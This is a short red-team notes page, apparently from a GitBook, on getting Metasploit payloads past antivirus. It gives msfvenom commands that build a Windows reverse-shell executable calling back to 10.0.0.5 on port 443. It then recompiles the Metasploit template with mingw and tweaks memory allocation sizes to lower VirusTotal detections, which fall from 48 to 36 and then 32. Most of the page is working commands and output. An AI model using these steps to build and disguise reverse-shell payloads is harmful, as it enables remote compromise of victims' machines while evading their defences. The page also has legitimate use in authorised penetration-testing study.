# AV Bypass with Metasploit Templates

Generating a standard MSF payload file:

```text
root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Checking the file in [VirusTotal](https://www.virustotal.com/#/file/ebf62a6140591b6ccf81035a7f06b3a6580144cfa5a9de0ad49dd323c4513ee3/detection):

![](../.gitbook/assets/msf-templates-default-payload.png)

The exe binary that was generated earlier used the below source code to generate the host binary that gets injected with the shellcode of our choice:

![](../.gitbook/assets/msf-template.png)

Recompile the standard template

```text
root@/usr/share/metasploit-framework/data/templates/src/pe/exe# i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe
```

Regenerate the payload with a new template:

```text
root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypass.exe -f exe > /root/tools/avbypass.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 363382 bytes
```

Detections dropped from 48 to 36 for only recompiling the binary template and not making any changes to it \([VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection)\):

![](../.gitbook/assets/msf-template-vt2.png)

If we make a couple of small changes to the code for memory allocation sizes:

![](../.gitbook/assets/msf-template-sizes.png)

[VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections drop from 36 to 32:

![](../.gitbook/assets/msf-template-vt3.png)

